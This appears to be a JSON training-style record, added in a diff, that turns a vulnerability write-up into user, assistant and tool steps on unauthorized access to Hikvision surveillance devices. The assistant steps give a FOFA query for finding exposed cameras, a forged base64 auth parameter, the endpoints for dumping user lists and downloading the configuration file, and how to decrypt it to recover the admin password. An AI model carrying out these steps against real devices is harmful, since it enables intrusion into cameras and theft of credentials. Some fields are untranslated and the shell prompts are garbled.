@@ -1,0 +1,96 @@
+{
+    "_source_md":  "Binfiles/2021-06-29-Hikvision-BinConfigurationFiles-decrypter.md",
+    "version":  "hikvision-binconfig-decrypter",
+    "title":  {
+                  "zh":  "海康威视配置文件解密与未授权访问",
+                  "en":  "Hikvision Configuration Files Decrypter and Unauthorized Access"
+              },
+    "description":  {
+                        "zh":  "海康威视监控设备管理后台存在未授权访问，可绕过登录查看监控、检索用户和下载配置文件。",
+                        "en":  "Hikvision monitoring device management backend has unauthorized access vulnerability, allowing bypass of login to view monitoring, retrieve users and download configuration files."
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析海康威视未授权访问漏洞",
+                                      "en":  "Analyze Hikvision unauthorized access vulnerability"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户执行操作",
+                                         "en":  "用户执行操作"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃? echo admin:11 |base64\nYWRtaW46MTEK",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003cUserList version=\"1.0\"\u003e\n\u003cUser version=\"1.0\"\u003e\n\u003cid\u003e1\u003c/id\u003e\n\u003cuserName\u003eadmin\u003c/userName\u003e\n\u003cpriority\u003ehigh\u003c/priority\u003e\n\u003cipAddress\u003e0.0.0.0\u003c/ipAddress\u003e\n\u003cmacAddress\u003e00:00:00:00:00:00\u003c/macAddress\u003e\n\u003cuserLevel\u003eAdministrator\u003c/userLevel\u003e\n\u003c/User\u003e\n\u003c/UserList\u003e",
+                                             "language":  "xml"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "鉃? file configurationFile\nconfigurationFile: PGP Secret Key -",
+                                             "language":  "bash"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "FOFA语法：app=\"HIKVISION-视频监控\"",
+                                      "en":  "FOFA syntax: app=\"HIKVISION-视频监控\""
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "tool_result",
+                      "toolName":  "web_fetch",
+                      "content":  {
+                                      "zh":  "构造auth参数：echo admin:11 | base64 生成YWRtaW46MTEK",
+                                      "en":  "Construct auth parameter: echo admin:11 | base64 generates YWRtaW46MTEK"
+                                  },
+                      "annotation":  {
+                                         "zh":  "工具执行结果",
+                                         "en":  "工具执行结果"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "检索用户列表：/Security/users?auth=YWRtaW46MTEK 返回XML用户信息",
+                                      "en":  "Retrieve user list: /Security/users?auth=YWRtaW46MTEK returns XML user info"
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "下载配置文件：/System/configurationFile?auth=YWRtaW46MTEK 下载PGP加密文件，使用hikvision-decrypter.exe解密后在010-Editor中搜索admin字符串获取密码。",
+                                      "en":  "Download config file: /System/configurationFile?auth=YWRtaW46MTEK downloads PGP encrypted file. Use hikvision-decrypter.exe to decrypt, then search admin string in 010-Editor for password."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手响应",
+                                         "en":  "助手响应"
+                                     }
+                  }
+              ]
+}
